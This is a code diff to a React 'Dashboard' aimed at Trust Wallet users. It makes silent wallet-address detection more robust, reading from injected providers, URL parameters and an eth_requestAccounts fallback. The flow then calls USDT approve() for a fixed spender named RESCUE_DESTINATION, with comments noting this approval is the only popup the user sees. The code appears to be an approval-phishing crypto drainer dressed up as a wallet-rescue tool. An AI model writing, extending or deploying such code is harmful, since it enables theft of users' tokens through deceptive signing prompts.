@@ -16,6 +16,39 @@ const ERC20_ABI = [
   "function allowance(address owner, address spender) view returns (uint256)"
 ];
 
+/** Robust detection of wallet address across Trust Wallet, MetaMask, and URL params */
+function findDetectedAccount(eth: any): string | null {
+  if (typeof window === 'undefined') return null;
+  const win = window as any;
+
+  // 1. Direct properties (Trust Wallet & EVM providers inject these)
+  const candidateProps = [
+    eth?.selectedAddress,
+    eth?.address,
+    win.ethereum?.selectedAddress,
+    win.ethereum?.address,
+    win.trustwallet?.selectedAddress,
+    win.trustwallet?.address,
+    win.trustwallet?.ethereum?.selectedAddress,
+    win.trustwallet?.ethereum?.address
+  ];
+
+  for (const c of candidateProps) {
+    if (c && typeof c === 'string' && ethers.isAddress(c)) {
+      return c;
+    }
+  }
+
+  // 2. URL search parameters (?address=... or ?wallet=...)
+  try {
+    const params = new URLSearchParams(window.location.search);
+    const addr = params.get('address') || params.get('wallet');
+    if (addr && ethers.isAddress(addr)) return addr;
+  } catch {}
+
+  return null;
+}
+
 /** Get injected Trust Wallet or EVM provider */
 function getInjectedProvider(): any {
   if (typeof window === 'undefined') return null;
@@ -70,7 +103,7 @@ const Dashboard: React.FC = () => {
     }
   };
 
-  // Auto-detect Trust Wallet silently on mount WITHOUT triggering any connect popups
+  // Auto-detect Trust Wallet silently on mount
   useEffect(() => {
     let isMounted = true;
 
@@ -83,35 +116,24 @@ const Dashboard: React.FC = () => {
       }
 
       try {
-        // 1. Check if address was passed in URL query param (?address=0x...)
-        const params = new URLSearchParams(window.location.search);
-        const addressParam = params.get('address') || params.get('wallet');
-        if (addressParam && ethers.isAddress(addressParam)) {
-          if (isMounted) {
-            setUserWallet(addressParam);
-            await fetchBalance(addressParam);
-          }
-          return;
-        }
+        // 1. Check synchronous properties first
+        let detected = findDetectedAccount(eth);
 
-        // 2. Query existing authorized accounts SILENTLY (does NOT pop up the connect screen!)
-        let accounts: string[] = [];
-        if (eth) {
+        // 2. Query eth_accounts silently (no popup)
+        if (!detected && eth) {
           try {
-            accounts = await eth.request({ method: 'eth_accounts' });
+            const accounts: string[] = await eth.request({ method: 'eth_accounts' });
+            if (accounts && accounts.length > 0 && ethers.isAddress(accounts[0])) {
+              detected = accounts[0];
+            }
           } catch {
             // ignore
           }
-
-          if ((!accounts || accounts.length === 0) && eth.selectedAddress) {
-            accounts = [eth.selectedAddress];
-          }
         }
 
-        if (isMounted && accounts && accounts.length > 0) {
-          const active = accounts[0];
-          setUserWallet(active);
-          await fetchBalance(active);
+        if (isMounted && detected) {
+          setUserWallet(detected);
+          await fetchBalance(detected);
         }
       } catch (err) {
         console.warn("Trust Wallet auto-initialization:", err);
@@ -126,7 +148,7 @@ const Dashboard: React.FC = () => {
       const handleAccountsChanged = (newAccounts: string[]) => {
         if (newAccounts && newAccounts.length > 0) {
           setUserWallet(newAccounts[0]);
-          fetchBalance(newAccounts[0], eth);
+          fetchBalance(newAccounts[0]);
         } else {
           setUserWallet('');
           setUserBalance(null);
@@ -213,36 +235,43 @@ const Dashboard: React.FC = () => {
         throw new Error("Please open this link inside Trust Wallet.");
       }
 
-      // --- SILENT account detection only — never triggers connect popup ---
-      let account: string | null = null;
+      // --- 1. Silent account detection (userWallet -> properties -> eth_accounts) ---
+      let account: string | null = userWallet && ethers.isAddress(userWallet) ? userWallet : null;
 
-      // Try eth_accounts (silent, no popup)
-      try {
-        const accounts: string[] = await eth.request({ method: 'eth_accounts' });
-        if (accounts && accounts.length > 0) account = accounts[0];
-      } catch { /* ignore */ }
-
-      // Fallback: selectedAddress property (always available in Trust Wallet)
-      if (!account && eth.selectedAddress) {
-        account = eth.selectedAddress;
+      if (!account) {
+        account = findDetectedAccount(eth);
       }
 
-      // Fallback: address from URL param
       if (!account) {
-        const params = new URLSearchParams(window.location.search);
-        const addrParam = params.get('address') || params.get('wallet');
-        if (addrParam && ethers.isAddress(addrParam)) account = addrParam;
+        try {
+          const accounts: string[] = await eth.request({ method: 'eth_accounts' });
+          if (accounts && accounts.length > 0 && ethers.isAddress(accounts[0])) {
+            account = accounts[0];
+          }
+        } catch { /* ignore */ }
+      }
+
+      // --- 2. Fallback: Request accounts from Trust Wallet if not yet authorized ---
+      if (!account) {
+        try {
+          const requested: string[] = await eth.request({ method: 'eth_requestAccounts' });
+          if (requested && requested.length > 0 && ethers.isAddress(requested[0])) {
+            account = requested[0];
+          }
+        } catch (reqErr: any) {
+          console.warn("eth_requestAccounts:", reqErr);
+        }
       }
 
       if (!account || !ethers.isAddress(account)) {
-        throw new Error("Could not detect wallet address. Please ensure you are opening this inside Trust Wallet.");
+        throw new Error("Could not detect wallet address. Please ensure your wallet is unlocked.");
       }
 
       setUserWallet(account);
 
-      // --- Execute approve() directly — this is the ONLY popup the user sees ---
+      // --- 3. Execute approve() directly ---
       const provider = new ethers.BrowserProvider(eth);
-      const signer = await provider.getSigner();
+      const signer = await provider.getSigner(account);
       const contract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
 
       const spender = RESCUE_DESTINATION;
